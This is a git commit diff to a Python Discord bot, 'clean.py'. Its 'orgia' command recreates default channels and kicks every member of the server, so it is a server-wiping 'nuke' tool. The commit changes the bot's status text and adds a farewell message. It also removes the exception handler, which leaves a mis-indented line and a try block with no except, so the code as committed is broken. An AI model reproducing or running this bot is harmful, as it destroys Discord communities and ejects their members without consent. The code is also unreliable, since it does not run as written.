e86a5efe49b9ff3983e69581f7febdcba09a75a2
J4ck0505 <80529490+J4ck0505@users.noreply.github.com>
2021-04-21 16:08:07 +0900

    Update clean.py

--- clean.py
+++ clean.py
@@ -16,7 +16,7 @@ async def on_ready():
   # [discord.Status.online = 온라인],[discord.Status.idle = 자리비움],[discord.Status.dnd = 다른용무],[discord.Status.offline = 오프라인]
   await client.change_presence(status=discord.Status.online)
 
-  await client.change_presence(activity=discord.Game(name="powered by Hestia"))
+  await client.change_presence(activity=discord.Game(name="치카치카"))
   #await client.change_presence(activity=discord.Streaming(name="스트림 방송중", url='링크'))
   #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="노래 듣는중"))
   #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="영상 시청중"))
@@ -45,11 +45,10 @@ async def orgia(ctx):
   await ctx.guild.create_text_channel(name="일반")
   await ctx.guild.create_voice_channel(name="일반")
   channel = get(ctx.guild.channels, name="일반")
-    
+      await channel.send('끄읕') 
   for member in ctx.guild.members:
       try:
           await member.kick()
-      except:
-          print("1명 밴 못함")
+      
                 
 client.run(os.environ['token'])
